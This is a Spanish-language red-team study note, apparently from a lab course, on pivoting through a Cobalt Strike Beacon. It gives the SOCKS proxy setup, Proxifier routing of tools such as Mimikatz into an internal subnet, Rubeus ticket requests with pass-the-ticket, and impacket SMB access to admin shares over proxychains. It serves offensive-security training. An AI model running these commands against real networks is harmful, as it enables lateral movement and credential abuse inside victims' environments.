---
title: Pivoting con Cobalt Strike — SOCKS + Proxifier + Kerberos
tags: [cobalt-strike, pivoting, socks, proxifier, kerberos]
---

# Pivoting con Cobalt Strike

## 1. Abrir proxy SOCKS desde el Beacon

```
beacon> socks 1080
```

Abre un proxy SOCKS4a en el puerto 1080 del **Teamserver**. Todo el tráfico se tuneliza a través del Beacon.

## 2. Configurar Proxifier (Windows)

### Añadir el servidor proxy

```
Profile → Proxy Servers → Add
  Server: <teamserver-ip>
  Port: 1080
  Protocol: SOCKS4
```

### Regla de proxificación

```
Profile → Proxification Rules → Add
  Nombre: C2 Pivot
  Applications: Any
  Target hosts: 10.10.110.0/24  ← red interna
  Action: Proxy SOCKS4
```

> [!tip] Proxifier permite enrutar herramientas Windows (Mimikatz, SharpHound, etc.) a través del pivot sin modificarlas.

## 3. Kerberos a través del SOCKS

Las herramientas Kerberos requieren resolución DNS y comunicación KDC. Para usarlas a través del proxy:

### Con Rubeus — crear proceso sacrificial

```
# En el objetivo (a través del Beacon)
beacon> execute-assembly C:\Tools\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /show
```

Esto abre un cmd.exe en un nuevo logon session sin credenciales (LUID vacío).

### Solicitar TGS (desde la máquina atacante via proxy)

```
beacon> execute-assembly C:\Tools\Rubeus.exe asktgs /service:ldap/lon-dc-1.cyberbotic.io /dc:lon-dc-1.cyberbotic.io /ptt /luid:0x<LUID>
```

### O directamente con impacket a través de proxychains

```bash
# proxychains4 con el proxy socks en la config
proxychains4 impacket-smbclient -k -no-pass //target.domain.local/c$
```

## 4. Verificar el proxy

```bash
# Test de conectividad a través del SOCKS
proxychains4 nmap -sT -Pn -p 445 10.10.110.10
```

## 5. Cerrar el proxy

```
beacon> socks stop
```

## Ver también
- [[03-post-explotacion/cs-post-ex/session-passing|Session Passing]]
- [[05-ad-attacks/kerberos/lateral-movement-services-(cs)|Lateral Movement Services (CS)]]
- [[05-ad-attacks/kerberos/rbcd|RBCD]]
- [[04-lateral-movement/tecnicas/reverse-port-forward-cobalt-strike|Reverse Port Forward Cobalt Strike]]
